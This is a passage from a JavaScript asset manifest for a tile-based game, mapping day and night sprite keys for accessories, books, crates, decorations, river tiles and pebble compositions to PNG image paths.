                    ACCESSORY26D: "img/day-accessory26.png",
                    ACCESSORY26N: "img/night-accessory26.png",
                    ACCESSORY27D: "img/day-accessory27.png",
                    ACCESSORY27N: "img/night-accessory27.png",
                    ACCESSORY28D: "img/day-accessory18.png",
                    ACCESSORY28N: "img/night-accessory18.png",
                    ACCESSORY29D: "img/day-accessory29.png",
                    ACCESSORY29N: "img/night-accessory29.png",
                    ACCESSORY30D: "img/day-accessory30.png",
                    ACCESSORY30N: "img/night-accessory30.png",
                    ACCESSORY31D: "img/day-accessory31.png",
                    ACCESSORY31N: "img/night-accessory31.png",
                    ACCESSORY32D: "img/day-accessory32.png",
                    ACCESSORY32N: "img/night-accessory32.png",
                    ACCESSORY33D: "img/day-accessory33.png",
                    ACCESSORY33N: "img/night-accessory33.png",
                    ACCESSORY34D: "img/day-accessory34.png",
                    ACCESSORY34N: "img/night-accessory34.png",
                    ACCESSORY35D: "img/day-accessory35.png",
                    ACCESSORY35N: "img/night-accessory35.png",
                    ACCESSORY36D: "img/day-accessory28.png",
                    ACCESSORY36N: "img/night-accessory28.png",
                    ACCESSORY37D: "img/day-accessory36.png",
                    ACCESSORY37N: "img/night-accessory36.png",
                    ACCESSORY38D: "img/day-accessory37.png",
                    ACCESSORY38N: "img/night-accessory37.png",
                    ACCESSORY39D: "img/day-accessory39.png",
                    ACCESSORY39N: "img/night-accessory39.png",
                    ACCESSORY40D: "img/day-accessory40.png",
                    ACCESSORY40N: "img/night-accessory40.png",
                    ACCESSORY41D: "img/day-accessory41.png",
                    ACCESSORY41N: "img/night-accessory41.png",
                    ACCESSORY42D: "img/day-accessory42.png",
                    ACCESSORY42N: "img/night-accessory42.png",
                    ACCESSORY43D: "img/day-accessory43.png",
                    ACCESSORY43N: "img/night-accessory43.png",
                    ACCESSORY44D: "img/day-accessory44.png",
                    ACCESSORY44N: "img/night-accessory44.png",
                    ACCESSORY45D: "img/day-accessory38.png",
                    ACCESSORY45N: "img/night-accessory38.png",
                    ACCESSORY46D: "img/day-accessory46.png",
                    ACCESSORY46N: "img/night-accessory46.png",
                    ACCESSORY47D: "img/day-accessory47.png",
                    ACCESSORY47N: "img/night-accessory47.png",
                    ACCESSORY48D: "img/day-accessory48.png",
                    ACCESSORY48N: "img/night-accessory48.png",
                    ACCESSORY49D: "img/day-accessory49.png",
                    ACCESSORY49N: "img/night-accessory49.png",
                    ACCESSORY50D: "img/day-accessory45.png",
                    ACCESSORY50N: "img/night-accessory45.png",
                    ACCESSORY51D: "img/day-accessory50.png",
                    ACCESSORY51N: "img/night-accessory50.png",
                    ACCESSORY52D: "img/day-accessory51.png",
                    ACCESSORY52N: "img/night-accessory51.png",
                    ACCESSORY53D: "img/day-accessory52.png",
                    ACCESSORY53N: "img/night-accessory52.png",
                    ACCESSORY54D: "img/day-accessory53.png",
                    ACCESSORY54N: "img/night-accessory53.png",
                    ACCESSORY55D: "img/day-accessory54.png",
                    ACCESSORY55N: "img/night-accessory54.png",
                    ACCESSORY56D: "img/day-accessory55.png",
                    ACCESSORY56N: "img/night-accessory55.png",
                    ACCESSORY57D: "img/day-accessory56.png",
                    ACCESSORY57N: "img/night-accessory56.png",
                    ACCESSORY58D: "img/day-accessory57.png",
                    ACCESSORY58N: "img/night-accessory57.png",
                    ACCESSORY59D: "img/day-accessory58.png",
                    ACCESSORY59N: "img/night-accessory58.png",
                    ACCESSORY60D: "img/day-accessory59.png",
                    ACCESSORY60N: "img/night-accessory59.png",
                    ACCESSORY61D: "img/day-accessory60.png",
                    ACCESSORY61N: "img/night-accessory60.png",
                    ACCESSORY62D: "img/day-accessory61.png",
                    ACCESSORY62N: "img/night-accessory61.png",
                    ACCESSORY63D: "img/day-accessory62.png",
                    ACCESSORY63N: "img/night-accessory62.png",
                    ACCESSORY64D: "img/day-accessory63.png",
                    ACCESSORY64N: "img/night-accessory63.png",
                    ACCESSORY65D: "img/day-accessory64.png",
                    ACCESSORY65N: "img/night-accessory64.png",
                    ACCESSORY66D: "img/day-accessory65.png",
                    ACCESSORY66N: "img/night-accessory65.png",
                    ACCESSORY67D: "img/day-accessory66.png",
                    ACCESSORY67N: "img/night-accessory66.png",
                    ACCESSORY68D: "img/day-accessory67.png",
                    ACCESSORY68N: "img/night-accessory67.png",
                    ACCESSORY69D: "img/day-accessory68.png",
                    ACCESSORY69N: "img/night-accessory68.png",
                    ACCESSORY70D: "img/day-accessory69.png",
                    ACCESSORY70N: "img/night-accessory69.png",
                    ACCESSORY71D: "img/day-accessory70.png",
                    ACCESSORY71N: "img/night-accessory70.png",
                    ACCESSORY72D: "img/day-accessory71.png",
                    ACCESSORY72N: "img/night-accessory71.png",
                    ACCESSORY73D: "img/day-accessory72.png",
                    ACCESSORY73N: "img/night-accessory72.png",
                    ACCESSORY74D: "img/day-accessory73.png",
                    ACCESSORY74N: "img/night-accessory73.png",
                    ACCESSORY75D: "img/day-accessory74.png",
                    ACCESSORY75N: "img/night-accessory74.png",
                    ACCESSORY76D: "img/day-accessory75.png",
                    ACCESSORY76N: "img/night-accessory75.png",
                    ACCESSORY77D: "img/day-accessory76.png",
                    ACCESSORY77N: "img/night-accessory76.png",
                    ACCESSORY78D: "img/day-accessory77.png",
                    ACCESSORY78N: "img/night-accessory77.png",
                    ACCESSORY79D: "img/day-accessory78.png",
                    ACCESSORY79N: "img/night-accessory78.png",
                    ACCESSORY80D: "img/day-accessory79.png",
                    ACCESSORY80N: "img/night-accessory79.png",
                    ACCESSORY81D: "img/day-accessory80.png",
                    ACCESSORY81N: "img/night-accessory80.png",
                    ACCESSORY82D: "img/day-accessory81.png",
                    ACCESSORY82N: "img/night-accessory81.png",
                    BOOK0D: "img/day-book0.png",
                    BOOK0N: "img/night-book0.png",
                    BOOK1D: "img/day-book1.png",
                    BOOK1N: "img/night-book1.png",
                    BOOK2D: "img/day-book2.png",
                    BOOK2N: "img/night-book2.png",
                    BOOK3D: "img/day-book3.png",
                    BOOK3N: "img/night-book3.png",
                    BOOK4D: "img/day-book4.png",
                    BOOK4N: "img/night-book4.png",
                    BOOK5D: "img/day-book5.png",
                    BOOK5N: "img/night-book5.png",
                    BOOK6D: "img/day-book6.png",
                    BOOK6N: "img/night-book6.png",
                    BOOK7D: "img/day-book7.png",
                    BOOK7N: "img/night-book7.png",
                    BOOK8D: "img/day-book8.png",
                    BOOK8N: "img/night-book8.png",
                    BOOK9D: "img/day-book9.png",
                    BOOK9N: "img/night-book9.png",
                    BOOK10D: "img/day-book10.png",
                    BOOK10N: "img/night-book10.png",
                    BOOK11D: "img/day-book11.png",
                    BOOK11N: "img/night-book11.png",
                    BOOK12D: "img/day-book12.png",
                    BOOK12N: "img/night-book12.png",
                    BOOK13D: "img/day-book13.png",
                    BOOK13N: "img/night-book13.png",
                    BOOK14D: "img/day-book14.png",
                    BOOK14N: "img/night-book14.png",
                    BOOK15D: "img/day-book15.png",
                    BOOK15N: "img/night-book15.png",
                    BOOK16D: "img/day-book16.png",
                    BOOK16N: "img/night-book16.png",
                    BOOK17D: "img/day-book17.png",
                    BOOK17N: "img/night-book17.png",
                    BOOK18D: "img/day-book18.png",
                    BOOK18N: "img/night-book18.png",
                    BOOK19D: "img/day-book19.png",
                    BOOK19N: "img/night-book19.png",
                    BOOK20D: "img/day-book20.png",
                    BOOK20N: "img/night-book20.png",
                    BOOK21D: "img/day-book21.png",
                    BOOK21N: "img/night-book21.png",
                    BOOK22D: "img/day-book22.png",
                    BOOK22N: "img/night-book22.png",
                    BOOK23D: "img/day-book23.png",
                    BOOK23N: "img/night-book23.png",
                    BOOK24D: "img/day-book24.png",
                    BOOK24N: "img/night-book24.png",
                    BOOK25D: "img/day-book25.png",
                    BOOK25N: "img/night-book25.png",
                    BOOK26D: "img/day-book26.png",
                    BOOK26N: "img/night-book26.png",
                    BOOK27D: "img/day-book27.png",
                    BOOK27N: "img/night-book27.png",
                    BOOK28D: "img/day-book28.png",
                    BOOK28N: "img/night-book28.png",
                    BOOK29D: "img/day-book29.png",
                    BOOK29N: "img/night-book29.png",
                    BOOK30D: "img/day-book30.png",
                    BOOK30N: "img/night-book30.png",
                    BOOK31D: "img/day-book31.png",
                    BOOK31N: "img/night-book31.png",
                    BOOK32D: "img/day-book32.png",
                    BOOK32N: "img/night-book32.png",
                    BOOK33D: "img/day-book33.png",
                    BOOK33N: "img/night-book33.png",
                    BOOK34D: "img/day-book34.png",
                    BOOK34N: "img/night-book34.png",
                    BOOK35D: "img/day-book35.png",
                    BOOK35N: "img/night-book35.png",
                    BOOK36D: "img/day-book36.png",
                    BOOK36N: "img/night-book36.png",
                    BOOK37D: "img/day-book37.png",
                    BOOK37N: "img/night-book37.png",
                    BOOK38D: "img/day-book38.png",
                    BOOK38N: "img/night-book38.png",
                    BOOK39D: "img/day-book39.png",
                    BOOK39N: "img/night-book39.png",
                    BOOK40D: "img/day-book40.png",
                    BOOK40N: "img/night-book40.png",
                    BOOK41D: "img/day-book41.png",
                    BOOK41N: "img/night-book41.png",
                    BOOK42D: "img/day-book42.png",
                    BOOK42N: "img/night-book42.png",
                    BOOK43D: "img/day-book43.png",
                    BOOK43N: "img/night-book43.png",
                    BOOK44D: "img/day-book44.png",
                    BOOK44N: "img/night-book44.png",
                    BOOK45D: "img/day-book45.png",
                    BOOK45N: "img/night-book45.png",
                    CRATE1D: "img/day-crate1.png",
                    CRATE1N: "img/night-crate1.png",
                    CRATE2D: "img/day-crate2.png",
                    CRATE2N: "img/night-crate2.png",
                    CRATE3D: "img/day-crate3.png",
                    CRATE3N: "img/night-crate3.png",
                    CRATE4D: "img/day-crate4.png",
                    CRATE4N: "img/night-crate4.png",
                    CRATE5D: "img/day-crate5.png",
                    CRATE5N: "img/night-crate5.png",
                    CRATE6D: "img/day-crate6.png",
                    CRATE6N: "img/night-crate6.png",
                    CRATE7D: "img/day-crate7.png",
                    CRATE7N: "img/night-crate7.png",
                    CRATE8D: "img/day-crate8.png",
                    CRATE8N: "img/night-crate8.png",
                    CRATE9D: "img/day-crate9.png",
                    CRATE9N: "img/night-crate9.png",
                    CRATE10D: "img/day-crate10.png",
                    CRATE10N: "img/night-crate10.png",
                    CRATE11D: "img/day-crate11.png",
                    CRATE11N: "img/night-crate11.png",
                    CRATE12D: "img/day-crate12.png",
                    CRATE12N: "img/night-crate12.png",
                    CRATE13D: "img/day-crate13.png",
                    CRATE13N: "img/night-crate13.png",
                    CRATE14D: "img/day-crate14.png",
                    CRATE14N: "img/night-crate14.png",
                    CRATE15D: "img/day-crate15.png",
                    CRATE15N: "img/night-crate15.png",
                    CRATE16D: "img/day-crate16.png",
                    CRATE16N: "img/night-crate16.png",
                    CRATE17D: "img/day-crate17.png",
                    CRATE17N: "img/night-crate17.png",
                    CRATE18D: "img/day-crate18.png",
                    CRATE18N: "img/night-crate18.png",
                    CRATE19D: "img/day-crate19.png",
                    CRATE19N: "img/night-crate19.png",
                    CRATE20D: "img/day-crate20.png",
                    CRATE20N: "img/night-crate20.png",
                    CRATE21D: "img/day-crate21.png",
                    CRATE21N: "img/night-crate21.png",
                    CRATE22D: "img/day-crate22.png",
                    CRATE22N: "img/night-crate22.png",
                    CRATE23D: "img/day-crate23.png",
                    CRATE23N: "img/night-crate23.png",
                    CRATE24D: "img/day-crate24.png",
                    CRATE24N: "img/night-crate24.png",
                    CRATE25D: "img/day-crate25.png",
                    CRATE25N: "img/night-crate25.png",
                    CRATE26D: "img/day-crate26.png",
                    CRATE26N: "img/night-crate26.png",
                    CRATE27D: "img/day-crate27.png",
                    CRATE27N: "img/night-crate27.png",
                    CRATE28D: "img/day-crate28.png",
                    CRATE28N: "img/night-crate28.png",
                    CRATE29D: "img/day-crate29.png",
                    CRATE29N: "img/night-crate29.png",
                    CRATE30D: "img/day-crate30.png",
                    CRATE30N: "img/night-crate30.png",
                    CRATE31D: "img/day-crate31.png",
                    CRATE31N: "img/night-crate31.png",
                    CRATE32D: "img/day-crate32.png",
                    CRATE32N: "img/night-crate32.png",
                    CRATE33D: "img/day-crate33.png",
                    CRATE33N: "img/night-crate33.png",
                    CRATE34D: "img/day-crate34.png",
                    CRATE34N: "img/night-crate34.png",
                    CRATE35D: "img/day-crate35.png",
                    CRATE35N: "img/night-crate35.png",
                    CRATE36D: "img/day-crate36.png",
                    CRATE36N: "img/night-crate36.png",
                    CRATE37D: "img/day-crate37.png",
                    CRATE37N: "img/night-crate37.png",
                    CRATE38D: "img/day-crate38.png",
                    CRATE38N: "img/night-crate38.png",
                    CRATE39D: "img/day-crate39.png",
                    CRATE39N: "img/night-crate39.png",
                    CRATE40D: "img/day-crate40.png",
                    CRATE40N: "img/night-crate40.png",
                    CRATE41D: "img/day-crate41.png",
                    CRATE41N: "img/night-crate41.png",
                    CRATE42D: "img/day-crate42.png",
                    CRATE42N: "img/night-crate42.png",
                    CRATE43D: "img/day-crate43.png",
                    CRATE43N: "img/night-crate43.png",
                    CRATE44D: "img/day-crate44.png",
                    CRATE44N: "img/night-crate44.png",
                    CRATE45D: "img/day-crate45.png",
                    CRATE45N: "img/night-crate45.png",
                    CRATE46D: "img/day-crate46.png",
                    CRATE46N: "img/night-crate46.png",
                    CRATE47D: "img/day-crate47.png",
                    CRATE47N: "img/night-crate47.png",
                    CRATE48D: "img/day-crate48.png",
                    CRATE48N: "img/night-crate48.png",
                    CRATE49D: "img/day-crate49.png",
                    CRATE49N: "img/night-crate49.png",
                    CRATE50D: "img/day-crate50.png",
                    CRATE50N: "img/night-crate50.png",
                    CRATE51D: "img/day-crate51.png",
                    CRATE51N: "img/night-crate51.png",
                    CRATE52D: "img/day-crate52.png",
                    CRATE52N: "img/night-crate52.png",
                    CRATE53D: "img/day-crate53.png",
                    CRATE53N: "img/night-crate53.png",
                    CRATE54D: "img/day-crate54.png",
                    CRATE54N: "img/night-crate54.png",
                    CRATE55D: "img/day-crate55.png",
                    CRATE55N: "img/night-crate55.png",
                    CRATE56D: "img/day-crate56.png",
                    CRATE56N: "img/night-crate56.png",
                    CRATE57D: "img/day-crate57.png",
                    CRATE57N: "img/night-crate57.png",
                    CRATE58D: "img/day-crate58.png",
                    CRATE58N: "img/night-crate58.png",
                    CRATE59D: "img/day-crate59.png",
                    CRATE59N: "img/night-crate59.png",
                    CRATE60D: "img/day-crate60.png",
                    CRATE60N: "img/night-crate60.png",
                    CRATE61D: "img/day-crate61.png",
                    CRATE61N: "img/night-crate61.png",
                    CRATE62D: "img/day-crate62.png",
                    CRATE62N: "img/night-crate62.png",
                    CRATE63D: "img/day-crate63.png",
                    CRATE63N: "img/night-crate63.png",
                    CRATE64D: "img/day-crate64.png",
                    CRATE64N: "img/night-crate64.png",
                    CRATE65D: "img/day-crate65.png",
                    CRATE65N: "img/night-crate65.png",
                    CRATE66D: "img/day-crate66.png",
                    CRATE66N: "img/night-crate66.png",
                    CRATE67D: "img/day-crate67.png",
                    CRATE67N: "img/night-crate67.png",
                    CRATE68D: "img/day-crate68.png",
                    CRATE68N: "img/night-crate68.png",
                    CRATE69D: "img/day-crate69.png",
                    CRATE69N: "img/night-crate69.png",
                    CRATE70D: "img/day-crate70.png",
                    CRATE70N: "img/night-crate70.png",
                    CRATE71D: "img/day-crate71.png",
                    CRATE71N: "img/night-crate71.png",
                    CRATE72D: "img/day-crate72.png",
                    CRATE72N: "img/night-crate72.png",
                    DECORATION_0D: "img/day-herb0.png",
                    DECORATION_1D: "img/day-herb1.png",
                    DECORATION_2D: "img/day-herb2.png",
                    DECORATION_3D: "img/day-herb3.png",
                    DECORATION_4D: "img/day-herb4.png",
                    DECORATION_5D: "img/day-herb5.png",
                    DECORATION_6D: "img/day-herb6.png",
                    DECORATION_7D: "img/day-herb7.png",
                    DECORATION_8D: "img/day-herb8.png",
                    DECORATION_9D: "img/day-herb9.png",
                    DECORATION_10D: "img/day-herb10.png",
                    DECORATION_11D: "img/day-herb11.png",
                    DECORATION_12D: "img/day-herb12.png",
                    DECORATION_13D: "img/day-herb13.png",
                    DECORATION_14D: "img/day-herb14.png",
                    DECORATION_15D: "img/day-herb15.png",
                    DECORATION_16D: "img/day-shell0.png",
                    DECORATION_17D: "img/day-shell1.png",
                    DECORATION_18D: "img/day-shell2.png",
                    DECORATION_19D: "img/day-leaf1.png",
                    DECORATION_20D: "img/day-leaf2.png",
                    DECORATION_21D: "img/day-leaf3.png",
                    DECORATION_22D: "img/day-leaf4.png",
                    DECORATION_23D: "img/day-leaf5.png",
                    DECORATION_24D: "img/day-leaf6.png",
                    DECORATION_25D: "img/day-leaf7.png",
                    DECORATION_26D: "img/day-leaf8.png",
                    DECORATION_27D: "img/day-rock0.png",
                    DECORATION_28D: "img/day-rock1.png",
                    DECORATION_29D: "img/day-rock2.png",
                    DECORATION_30D: "img/day-rock3.png",
                    DECORATION_31D: "img/day-rock4.png",
                    DECORATION_32D: "img/day-rock5.png",
                    DECORATION_33D: "img/day-rock6.png",
                    DECORATION_34D: "img/day-rock7.png",
                    DECORATION_35D: "img/day-rock8.png",
                    DECORATION_36D: "img/day-rock9.png",
                    DECORATION_37D: "img/day-rock10.png",
                    DECORATION_38D: "img/day-rock11.png",
                    DECORATION_39D: "img/day-rock12.png",
                    DECORATION_40D: "img/day-rock13.png",
                    DECORATION_41D: "img/day-flower1.png",
                    DECORATION_42D: "img/day-flower2.png",
                    DECORATION_43D: "img/day-flower3.png",
                    DECORATION_44D: "img/day-flower4.png",
                    DECORATION_45D: "img/day-flower5.png",
                    DECORATION_46D: "img/day-flower6.png",
                    DECORATION_47D: "img/day-flower7.png",
                    DECORATION_48D: "img/day-flower8.png",
                    DECORATION_49D: "img/day-flower9.png",
                    DECORATION_50D: "img/day-herb16.png",
                    DECORATION_51D: "img/day-herb17.png",
                    DECORATION_52D: "img/day-herb18.png",
                    DECORATION_53D: "img/day-herb19.png",
                    DECORATION_54D: "img/day-herb20.png",
                    DECORATION_55D: "img/day-herb21.png",
                    DECORATION_0N: "img/night-herb0.png",
                    DECORATION_1N: "img/night-herb1.png",
                    DECORATION_2N: "img/night-herb2.png",
                    DECORATION_3N: "img/night-herb3.png",
                    DECORATION_4N: "img/night-herb4.png",
                    DECORATION_5N: "img/night-herb5.png",
                    DECORATION_6N: "img/night-herb6.png",
                    DECORATION_7N: "img/night-herb7.png",
                    DECORATION_8N: "img/night-herb8.png",
                    DECORATION_9N: "img/night-herb9.png",
                    DECORATION_10N: "img/night-herb10.png",
                    DECORATION_11N: "img/night-herb11.png",
                    DECORATION_12N: "img/night-herb12.png",
                    DECORATION_13N: "img/night-herb13.png",
                    DECORATION_14N: "img/night-herb14.png",
                    DECORATION_15N: "img/night-herb15.png",
                    DECORATION_16N: "img/night-shell0.png",
                    DECORATION_17N: "img/night-shell1.png",
                    DECORATION_18N: "img/night-shell2.png",
                    DECORATION_19N: "img/night-leaf1.png",
                    DECORATION_20N: "img/night-leaf2.png",
                    DECORATION_21N: "img/night-leaf3.png",
                    DECORATION_22N: "img/night-leaf4.png",
                    DECORATION_23N: "img/night-leaf5.png",
                    DECORATION_24N: "img/night-leaf6.png",
                    DECORATION_25N: "img/night-leaf7.png",
                    DECORATION_26N: "img/night-leaf8.png",
                    DECORATION_27N: "img/night-rock0.png",
                    DECORATION_28N: "img/night-rock1.png",
                    DECORATION_29N: "img/night-rock2.png",
                    DECORATION_30N: "img/night-rock3.png",
                    DECORATION_31N: "img/night-rock4.png",
                    DECORATION_32N: "img/night-rock5.png",
                    DECORATION_33N: "img/night-rock6.png",
                    DECORATION_34N: "img/night-rock7.png",
                    DECORATION_35N: "img/night-rock8.png",
                    DECORATION_36N: "img/night-rock9.png",
                    DECORATION_37N: "img/night-rock10.png",
                    DECORATION_38N: "img/night-rock11.png",
                    DECORATION_39N: "img/night-rock12.png",
                    DECORATION_40N: "img/night-rock13.png",
                    DECORATION_41N: "img/night-flower1.png",
                    DECORATION_42N: "img/night-flower2.png",
                    DECORATION_43N: "img/night-flower3.png",
                    DECORATION_44N: "img/night-flower4.png",
                    DECORATION_45N: "img/night-flower5.png",
                    DECORATION_46N: "img/night-flower6.png",
                    DECORATION_47N: "img/night-flower7.png",
                    DECORATION_48N: "img/night-flower8.png",
                    DECORATION_49N: "img/night-flower9.png",
                    DECORATION_50N: "img/night-herb16.png",
                    DECORATION_51N: "img/night-herb17.png",
                    DECORATION_52N: "img/night-herb18.png",
                    DECORATION_53N: "img/night-herb19.png",
                    DECORATION_54N: "img/night-herb20.png",
                    DECORATION_55N: "img/night-herb21.png",
                    DAY_RIVER_000_010_000: "img/day-river000-010-000.png",
                    DAY_RIVER_000_010_010: "img/day-river000-010-010.png",
                    DAY_RIVER_000_011_000: "img/day-river000-011-000.png",
                    DAY_RIVER_000_011_010: "img/day-river000-011-010.png",
                    DAY_RIVER_000_011_011: "img/day-river000-011-011.png",
                    DAY_RIVER_000_110_000: "img/day-river000-110-000.png",
                    DAY_RIVER_000_110_010: "img/day-river000-110-010.png",
                    DAY_RIVER_000_110_110: "img/day-river000-110-110.png",
                    DAY_RIVER_000_111_000: "img/day-river000-111-000.png",
                    DAY_RIVER_000_111_010: "img/day-river000-111-010.png",
                    DAY_RIVER_000_111_011: "img/day-river000-111-011.png",
                    DAY_RIVER_000_111_110: "img/day-river000-111-110.png",
                    DAY_RIVER_000_111_111: "img/day-river000-111-111.png",
                    DAY_RIVER_010_010_000: "img/day-river010-010-000.png",
                    DAY_RIVER_010_010_010: "img/day-river010-010-010.png",
                    DAY_RIVER_010_011_000: "img/day-river010-011-000.png",
                    DAY_RIVER_010_011_010: "img/day-river010-011-010.png",
                    DAY_RIVER_010_011_011: "img/day-river010-011-011.png",
                    DAY_RIVER_010_110_000: "img/day-river010-110-000.png",
                    DAY_RIVER_010_110_010: "img/day-river010-110-010.png",
                    DAY_RIVER_010_110_110: "img/day-river010-110-110.png",
                    DAY_RIVER_010_111_000: "img/day-river010-111-000.png",
                    DAY_RIVER_010_111_010: "img/day-river010-111-010.png",
                    DAY_RIVER_010_111_011: "img/day-river010-111-011.png",
                    DAY_RIVER_010_111_110: "img/day-river010-111-110.png",
                    DAY_RIVER_010_111_111: "img/day-river010-111-111.png",
                    DAY_RIVER_011_011_000: "img/day-river011-011-000.png",
                    DAY_RIVER_011_011_010: "img/day-river011-011-010.png",
                    DAY_RIVER_011_011_011: "img/day-river011-011-011.png",
                    DAY_RIVER_011_111_000: "img/day-river011-111-000.png",
                    DAY_RIVER_011_111_010: "img/day-river011-111-010.png",
                    DAY_RIVER_011_111_011: "img/day-river011-111-011.png",
                    DAY_RIVER_011_111_110: "img/day-river011-111-110.png",
                    DAY_RIVER_011_111_111: "img/day-river011-111-111.png",
                    DAY_RIVER_110_110_000: "img/day-river110-110-000.png",
                    DAY_RIVER_110_110_010: "img/day-river110-110-010.png",
                    DAY_RIVER_110_110_110: "img/day-river110-110-110.png",
                    DAY_RIVER_110_111_000: "img/day-river110-111-000.png",
                    DAY_RIVER_110_111_010: "img/day-river110-111-010.png",
                    DAY_RIVER_110_111_011: "img/day-river110-111-011.png",
                    DAY_RIVER_110_111_110: "img/day-river110-111-110.png",
                    DAY_RIVER_110_111_111: "img/day-river110-111-111.png",
                    DAY_RIVER_111_111_011: "img/day-river111-111-011.png",
                    DAY_RIVER_111_111_110: "img/day-river111-111-110.png",
                    DAY_RIVER_111_111_000: "img/day-river111-111-000.png",
                    DAY_RIVER_111_111_111: "img/day-river111-111-111.png",
                    DAY_RIVER_111_111_010: "img/day-river111-111-010.png",
                    NIGHT_RIVER_000_010_000: "img/night-river000-010-000.png",
                    NIGHT_RIVER_000_010_010: "img/night-river000-010-010.png",
                    NIGHT_RIVER_000_011_000: "img/night-river000-011-000.png",
                    NIGHT_RIVER_000_011_010: "img/night-river000-011-010.png",
                    NIGHT_RIVER_000_011_011: "img/night-river000-011-011.png",
                    NIGHT_RIVER_000_110_000: "img/night-river000-110-000.png",
                    NIGHT_RIVER_000_110_010: "img/night-river000-110-010.png",
                    NIGHT_RIVER_000_110_110: "img/night-river000-110-110.png",
                    NIGHT_RIVER_000_111_000: "img/night-river000-111-000.png",
                    NIGHT_RIVER_000_111_010: "img/night-river000-111-010.png",
                    NIGHT_RIVER_000_111_011: "img/night-river000-111-011.png",
                    NIGHT_RIVER_000_111_110: "img/night-river000-111-110.png",
                    NIGHT_RIVER_000_111_111: "img/night-river000-111-111.png",
                    NIGHT_RIVER_010_010_000: "img/night-river010-010-000.png",
                    NIGHT_RIVER_010_010_010: "img/night-river010-010-010.png",
                    NIGHT_RIVER_010_011_000: "img/night-river010-011-000.png",
                    NIGHT_RIVER_010_011_010: "img/night-river010-011-010.png",
                    NIGHT_RIVER_010_011_011: "img/night-river010-011-011.png",
                    NIGHT_RIVER_010_110_000: "img/night-river010-110-000.png",
                    NIGHT_RIVER_010_110_010: "img/night-river010-110-010.png",
                    NIGHT_RIVER_010_110_110: "img/night-river010-110-110.png",
                    NIGHT_RIVER_010_111_000: "img/night-river010-111-000.png",
                    NIGHT_RIVER_010_111_010: "img/night-river010-111-010.png",
                    NIGHT_RIVER_010_111_011: "img/night-river010-111-011.png",
                    NIGHT_RIVER_010_111_110: "img/night-river010-111-110.png",
                    NIGHT_RIVER_010_111_111: "img/night-river010-111-111.png",
                    NIGHT_RIVER_011_011_000: "img/night-river011-011-000.png",
                    NIGHT_RIVER_011_011_010: "img/night-river011-011-010.png",
                    NIGHT_RIVER_011_011_011: "img/night-river011-011-011.png",
                    NIGHT_RIVER_011_111_000: "img/night-river011-111-000.png",
                    NIGHT_RIVER_011_111_010: "img/night-river011-111-010.png",
                    NIGHT_RIVER_011_111_011: "img/night-river011-111-011.png",
                    NIGHT_RIVER_011_111_110: "img/night-river011-111-110.png",
                    NIGHT_RIVER_011_111_111: "img/night-river011-111-111.png",
                    NIGHT_RIVER_110_110_000: "img/night-river110-110-000.png",
                    NIGHT_RIVER_110_110_010: "img/night-river110-110-010.png",
                    NIGHT_RIVER_110_110_110: "img/night-river110-110-110.png",
                    NIGHT_RIVER_110_111_000: "img/night-river110-111-000.png",
                    NIGHT_RIVER_110_111_010: "img/night-river110-111-010.png",
                    NIGHT_RIVER_110_111_011: "img/night-river110-111-011.png",
                    NIGHT_RIVER_110_111_110: "img/night-river110-111-110.png",
                    NIGHT_RIVER_110_111_111: "img/night-river110-111-111.png",
                    NIGHT_RIVER_111_111_011: "img/night-river111-111-011.png",
                    NIGHT_RIVER_111_111_110: "img/night-river111-111-110.png",
                    NIGHT_RIVER_111_111_000: "img/night-river111-111-000.png",
                    NIGHT_RIVER_111_111_111: "img/night-river111-111-111.png",
                    NIGHT_RIVER_111_111_010: "img/night-river111-111-010.png",
                    DAY_RIVER_COMPO1: "img/day-pebblecompo1.png",
                    DAY_RIVER_COMPO2: "img/day-pebblecompo2.png",
                    DAY_RIVER_COMPO3: "img/day-pebblecompo3.png",
                    DAY_RIVER_COMPO4: "img/day-pebblecompo4.png",
                    DAY_RIVER_COMPO5: "img/day-pebblecompo5.png",
                    DAY_RIVER_COMPO6: "img/day-pebblecompo6.png",
                    DAY_RIVER_COMPO7: "img/day-pebblecompo7.png",
                    DAY_RIVER_COMPO8: "img/day-pebblecompo8.png",
                    DAY_RIVER_COMPO9: "img/day-pebblecompo9.png",
                    DAY_RIVER_COMPO10: "img/day-pebblecompo10.png",
                    DAY_RIVER_COMPO11: "img/day-pebblecompo11.png",
                    DAY_RIVER_COMPO12: "img/day-pebblecompo12.png",
                    DAY_RIVER_COMPO13: "img/day-pebblecompo13.png",
                    DAY_RIVER_COMPO14: "img/day-pebblecompo14.png",
                    DAY_RIVER_COMPO15: "img/day-pebblecompo15.png",
                    DAY_RIVER_COMPO16: "img/day-pebblecompo16.png",
                    DAY_RIVER_COMPO17: "img/day-pebblecompo17.png",
                    DAY_RIVER_COMPO18: "img/day-pebblecompo18.png",
                    DAY_RIVER_COMPO19: "img/day-pebblecompo19.png",
                    DAY_RIVER_COMPO20: "img/day-pebblecompo20.png",
                    DAY_RIVER_COMPO21: "img/day-pebblecompo21.png",
                    DAY_RIVER_COMPO22: "img/day-pebblecompo22.png",
                    DAY_RIVER_COMPO23: "img/day-pebblecompo23.png",
                    DAY_RIVER_COMPO24: "img/day-pebblecompo24.png",
                    DAY_RIVER_COMPO25: "img/day-pebblecompo25.png",
                    DAY_RIVER_COMPO26: "img/day-pebblecompo26.png",
                    DAY_RIVER_COMPO27: "img/day-pebblecompo27.png",
                    DAY_RIVER_COMPO28: "img/day-pebblecompo28.png",
                    NIGHT_RIVER_COMPO1: "img/night-pebblecompo1.png",
                    NIGHT_RIVER_COMPO2: "img/night-pebblecompo2.png",
                    NIGHT_RIVER_COMPO3: "img/night-pebblecompo3.png",
                    NIGHT_RIVER_COMPO4: "img/night-pebblecompo4.png",
                    NIGHT_RIVER_COMPO5: "img/night-pebblecompo5.png",
                    NIGHT_RIVER_COMPO6: "img/night-pebblecompo6.png",
                    NIGHT_RIVER_COMPO7: "img/night-pebblecompo7.png",
                    NIGHT_RIVER_COMPO8: "img/night-pebblecompo8.png",
                    NIGHT_RIVER_COMPO9: "img/night-pebblecompo9.png",
                    NIGHT_RIVER_COMPO10: "img/night-pebblecompo10.png",
                    NIGHT_RIVER_COMPO11: "img/night-pebblecompo11.png",
                    NIGHT_RIVER_COMPO12: "img/night-pebblecompo12.png",
                    NIGHT_RIVER_COMPO13: "img/night-pebblecompo13.png",
                    NIGHT_RIVER_COMPO14: "img/night-pebblecompo14.png",
                    NIGHT_RIVER_COMPO15: "img/night-pebblecompo15.png",
                    NIGHT_RIVER_COMPO16: "img/night-pebblecompo16.png",
                    NIGHT_RIVER_COMPO17: "img/night-pebblecompo17.png",
                    NIGHT_RIVER_COMPO18: "img/night-pebblecompo18.png",
                    NIGHT_RIVER_COMPO19: "img/night-pebblecompo19.png",
